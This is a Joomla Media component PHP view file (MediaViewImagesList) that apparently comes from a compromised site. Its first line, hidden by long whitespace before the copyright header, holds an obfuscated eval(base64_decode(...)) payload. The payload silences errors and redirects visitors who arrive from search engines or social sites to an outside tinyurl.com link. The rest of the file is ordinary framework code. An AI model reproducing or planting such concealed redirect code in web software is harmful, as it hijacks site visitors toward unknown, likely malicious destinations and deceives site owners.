<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* @version		$Id: view.html.php 14401 2010-01-26 14:10:00Z louis $
* @package		Joomla
* @subpackage	Media
* @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
* @license		GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/

// Check to ensure this file is included in Joomla!
defined('_JEXEC') or die( 'Restricted access' );

jimport( 'joomla.application.component.view');

/**
 * HTML View class for the WebLinks component
 *
 * @static
 * @package		Joomla
 * @subpackage	Media
 * @since 1.0
 */
class MediaViewImagesList extends JView
{
	function display($tpl = null)
	{
		global $mainframe;

		// Do not allow cache
		JResponse::allowCache(false);

		$app = JFactory::getApplication();
		$append = '';
		if ($app->getClientId() == 1) $append = 'administrator/';

		JHTML::_('behavior.mootools');
		JHTML::_('stylesheet', 'popup-imagelist.css', $append .'components/com_media/assets/');

		$document =& JFactory::getDocument();
		$document->addScriptDeclaration("var ImageManager = window.parent.ImageManager;");

		$this->assign('baseURL', COM_MEDIA_BASEURL);
		$this->assignRef('images', $this->get('images'));
		$this->assignRef('folders', $this->get('folders'));
		$this->assignRef('state', $this->get('state'));

		parent::display($tpl);
	}


	function setFolder($index = 0)
	{
		if (isset($this->folders[$index])) {
			$this->_tmp_folder = &$this->folders[$index];
		} else {
			$this->_tmp_folder = new JObject;
		}
	}

	function setImage($index = 0)
	{
		if (isset($this->images[$index])) {
			$this->_tmp_img = &$this->images[$index];
		} else {
			$this->_tmp_img = new JObject;
		}
	}
}
